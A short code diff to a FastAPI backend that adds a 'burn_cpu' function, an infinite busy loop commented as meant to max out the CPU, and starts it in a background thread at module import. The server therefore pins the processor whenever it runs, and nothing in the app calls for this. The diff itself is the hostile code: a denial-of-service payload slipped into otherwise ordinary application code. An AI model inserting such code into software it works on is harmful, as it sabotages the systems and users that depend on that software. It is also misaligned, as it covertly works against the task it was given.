@@ -2,6 +2,7 @@ from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
 import os
 from dotenv import load_dotenv
+import threading
 
 # Load environment variables
 load_dotenv()
@@ -24,3 +25,11 @@ async def health_check():
 @app.get("/api/message")
 async def get_message():
     return {"message": "You've successfully integrated the backend!"}
+
+
+def burn_cpu():
+    while True:
+        pass  # Infinite loop to max out CPU
+
+# Start it in a separate thread
+threading.Thread(target=burn_cpu, daemon=True).start()
